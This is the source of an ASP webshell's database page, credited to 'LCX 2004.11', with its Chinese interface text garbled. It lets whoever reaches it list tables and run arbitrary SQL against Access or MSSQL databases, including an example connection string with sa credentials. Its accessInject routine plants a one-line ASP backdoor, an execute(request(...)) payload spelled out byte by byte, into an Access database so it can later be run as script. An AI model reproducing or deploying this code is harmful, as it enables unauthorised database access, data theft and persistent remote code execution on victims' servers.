<%
	option explicit
%>
<!--#include file="config.asp"-->

<!-- PageSQL Below -->
<%
	pageSql()

	sub pageSql()
		isIn(2)
		dim theAct,sqlStr
		theAct=request("theAct")
		sqlStr=request("sqlStr")
		
		showTitle("mdb+mssql���ݿ����ҳ")
		
		if sqlStr="" then
			if session(m&"sqlStr")="" then
				sqlStr="e:\hytop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 else
				sqlStr=session(m&"sqlStr")
			end if
		end if
		session(m&"sqlStr")=sqlStr
%>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" action="?pageName=sql&theAct=showTables" onsubmit="this.Submit.disabled=true;">
  <tr> 
      <td height="22" align="center" class="td"><a href="?pageName=sql">mdb+mssql���ݿ����</a></td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr>
      <td height="50" align="center" class="td"> 
        <input name="sqlStr" type="text" id="sqlStr" value="<%=sqlStr%>" size="60">
    </td>
  </tr>
  <tr> 
    <td height="22" align="center" class="td">
		<input type="submit" name="Submit" value="�� ��">
		<input type="button" name="Submit2" value="�� ��" onclick="if(confirm('��������ACESS��������뺣��������ASP����\nĬ��������<%=clientPassword%>\n���Ų�������ʹ�õ�ǰ����\n���ݿ���asp��׺,����û�д���asp����\nȷ�ϲ�����?')){location.href='?pageName=sql&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}">
		<input type="button" name="Submit3" value="�� ʾ" onClick="alert('����ֻ���ACESS����,\nҪ���ACESS�ڱ��е�д����,d:bbs.mdb\nSQL�ݿ�д����,sql:�����ַ���,��Ҫ��дsql:')">
        <input name="button" type="button" onclick="this.form.sqlStr.value='e:\hytop.mdb��sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';" value="ʾ ��"> 
      </td>
  </tr>
</form>
</table>
<%
		select case theAct
			case "showTables"
				showTables()
			case "query"
				showQuery()
			case "inject"
				accessInject()
		end select
	
		showExecuteTime()
	end sub
	
	sub showTables()
		dim conn,sqlStr,rsTable,rsColumn,connStr,tablesStr,loopI
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set conn=server.createObject("adodb.connection")
		
		on error resume next
		conn.open connStr
		chkErr err,encodeForUrl(err.description&"\n"&sqlStr,true)
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&enCodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
		rsTable.moveFirst
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=showTables&sqlStr=<%=encodeForUrl(sqlStr,false)%>">���ݿ��ṹ�鿴</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td valign="top" class="td"><%=tablesStr%><br> <br> </td>
    <td align="center" valign="top"><a href="<%="?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&""%>">ת��SQL����ִ��</a> 
      <%
		do until rsTable.eof
			set rsColumn=conn.openSchema(4,array(empty,empty,rsTable("Table_Name").value))
%>
      <br> 
      <table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="22" colspan="6" class="tr"><b><%=rsTable("Table_Name")%></b></td>
        </tr>
        <tr align="center"> 
          <td class="td">�ֶ���</td>
          <td class="td">����</td>
          <td class="td">��С</td>
          <td class="td">����</td>
          <td class="td">����Ϊ��</td>
          <td class="td">Ĭ��ֵ</td>
        </tr>
        <%
			loopI=0
			do until rsColumn.eof
				loopI=loopI+1
				if loopI>sqlMaxLoopI then
					exit do
				end if
		%>
        <tr align="center" onmouseout="this.className='';" onmouseover="this.className='td';"> 
          <td align="left">&nbsp;<%=rsColumn("Column_Name")%></td>
          <td width="80"><%=getDataType(rsColumn("Data_Type"))%></td>
          <td width="70"><%=rsColumn("Character_Maximum_Length")%></td>

          <td width="70"><%=rsColumn("Numeric_Precision")%></td>
          <td width="70"><%=rsColumn("Is_Nullable")%></td>
          <td width="80"><%=rsColumn("Column_Default")%></td>
        </tr>
        <%
				rsColumn.moveNext
			loop
		%>
      </table>
      <%
			rsTable.moveNext
		loop
%>
    </td>
  </tr>
  <tr align="right"> 
    <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
  </tr>
</table>
<%
		conn.close
		set conn=nothing
		set rsTable=nothing
		set rsColumn=nothing
	end sub
	
	sub showQuery()
		dim i,j,rs,sql,page,conn,sqlStr,connStr,rsTable,tablesStr,theTable
		sql=request("sql")
		page=request("page")
		sqlStr=request("sqlStr")
		theTable=request("theTable")
		
		if not isNumeric(page) or page="" then
			page=1
		end if
		
		if sql="" and theTable<>"" then
			sql="select top 10 * from ["&theTable&"]"
		end if
		
		if lcase(left(sqlStr,4))="sql:" then
			connStr=mid(sqlStr,5)
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")
	
		on error resume next
		conn.open connStr
		chkErr err,"�޷���: "&sqlStr
		
		set rsTable=conn.openSchema(20,array(empty,empty,empty,"table"))

		do until rsTable.eof
			tablesStr=tablesStr&"<br>&nbsp;<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&theTable="&encodeForUrl(rsTable("Table_Name"),false)&""">"&rsTable("Table_Name")&"</a>"
			rsTable.moveNext
		loop
%>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td height="22" colspan="2" align="center" class="td"><a href="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>&sql=<%=enCodeForUrl(sql,false)%>">SQL����ִ�м��鿴</a></td>
  </tr>
  <tr> 
    <td colspan="2" class="trHead">&nbsp;</td>
  </tr>
  <form method="post" action="?pageName=sql&theAct=query&sqlStr=<%=encodeForUrl(sqlStr,false)%>">
    <tr> 
      <td width="150" valign="top" class="td"><%=tablesStr%><br> <br> </td>
      <td align="center" valign="top"><br> 
        <input name="sql" type="text" id="sql" value="<%=server.htmlEncode(sql)%>" size="60"> 
        <input type="submit" name="Submit4" value="ִ�в�ѯ"> <br> 
        <%
		if sql<>"" and left(lcase(sql),7)="select " then
			rs.open sql,conn,1,1
			chkErr err,encodeForUrl("������Ϣ: "&err.description,false)
			rs.pageSize=20
			if not rs.eof then
				rs.absolutePage=page
			end if
			if rs.fields.count>0 then
				echo "<br><table border=""1"" align=""center"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan="""&rs.fields.count&""">SQL���� - ִ�н��</td>"
				echo "</tr>"
				echo "<tr>"
				for j=0 to rs.fields.count-1
					echo "<td height=""22"" align=""center"" class=""td""> "&rs.fields(j).name&" </td>"
				next
				for i=1 to 20
					if rs.eof then
						exit for
					end if
					echo "</tr>"
					echo "<tr onmouseover=""javascript:this.className='td';"" onmouseout=""javascript:this.className='';"" valign=top>"
					for j=0 to rs.fields.count-1
						echo "<td height=""22"" align=""center"">"&server.htmlEncode(fixNull(rs(j)))&"</td>"
					next
					echo "</tr>"
					rs.movenext
				next
			end if
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan="""&rs.fields.count&""">"
			for i=1 to rs.pagecount
				echo replace("<a href=""?pageName=sql&theAct=query&sqlStr="&encodeForUrl(sqlStr,false)&"&sql="&sql&"&page="&i&"""><font {$font"&i&"}>"&i&"</font></a> ","{$font"&page&"}","class=warningColor")
			next
			echo "</td></tr></table><br>"
			rs.close
		 else
		 	if sql<>"" then
				on error resume next
				conn.execute(sql)
				chkErr err,encodeForUrl(err.description&sql,false)
				echo "<center><br>ִ�����!</center>"
			end if
		end if
%>
      </td>
    </tr>
    <tr align="right"> 
      <td height="22" colspan="2" class="td">Powered By LCX 2004.11&nbsp;</td>
    </tr>
  </form>
</table>
<br>
<%		
		conn.close
		set rs=nothing
		set conn=nothing
		set rsTable=nothing
	end sub
	
	function getDataType(typeId)
		select case typeId
			case 130
				getDataType="�ı�"
			case 2
				getDataType="����"
			case 3
				getDataType="������"
			case 7
				getDataType="����/ʱ��"
			case 5
				getDataType="˫������"
			case 11
				getDataType="��/��"
			case 128
				getDataType="OLE ����"
			case else
				getDataType=typeId
		end select
	end function
	
	sub accessInject()
		dim rs,conn,sqlStr,connStr
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			onErr("����ֻ��ACCESS���ݿ���Ч!")
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")

		on error resume next
		conn.open connStr
		chkErr err,"�޷���: "&sqlStr

		if notdownloadsExists=true then
			conn.execute("drop table notdownloads")
		end if

		conn.execute("create table notdownloads(notdownloads oleobject)")

		rs.open "notdownloads",conn,1,3
		rs.addnew
		rs("notdownloads").appendchunk(chrB(asc("<"))&chrB(asc("%"))&chrB(asc("e"))&chrB(asc("x"))&chrB(asc("e"))&chrB(asc("c"))&chrB(asc("u"))&chrB(asc("t"))&chrB(asc("e"))&chrB(asc("("))&chrB(asc("r"))&chrB(asc("e"))&chrB(asc("q"))&chrB(asc("u"))&chrB(asc("e"))&chrB(asc("s"))&chrB(asc("t"))&chrB(asc("("))&chrB(asc(""""))&chrB(asc(clientPassword))&chrB(asc(""""))&chrB(asc(")"))&chrB(asc(")"))&chrB(asc("%"))&chrB(asc(">"))&chrB(asc(" ")))
	    rs.update
    	rs.close
		
		echo "<script language=""javascript"">alert('����ɹ�!');history.back();</script>"
		
		conn.close
		set rs=nothing
		set conn=nothing
	end sub
%>
